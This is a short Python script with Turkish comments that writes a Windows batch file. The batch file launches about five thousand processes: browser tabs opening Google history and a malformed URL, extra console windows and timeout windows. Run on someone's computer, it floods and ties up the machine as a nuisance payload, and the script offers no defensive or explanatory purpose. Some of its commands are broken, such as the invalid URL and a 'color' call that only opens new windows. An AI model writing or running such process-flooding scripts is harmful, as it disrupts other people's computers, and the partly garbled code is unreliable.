import os

def create_file(file_name):
    # Dosya adına ".bat" uzantısını ekle
    file_name = file_name + ".bat"

    # Dosyayı oluştur
    with open(file_name, "w") as f:
        # Komutları yaz
        f.write("@echo off\n")

       # Her Şeyi 1.000 Kele Yaz
        for _ in range(1000):
            f.write("start shutdown /a\n")
            f.write("start https://www.google.com/history\n")
            f.write("start color 5\n")
            f.write("start https://mal-her-dosyayı-açma\n")
            f.write("start timeout /t 60\n")
    # Dosya yolunu döndür
    return os.path.join(os.path.dirname(__file__), file_name)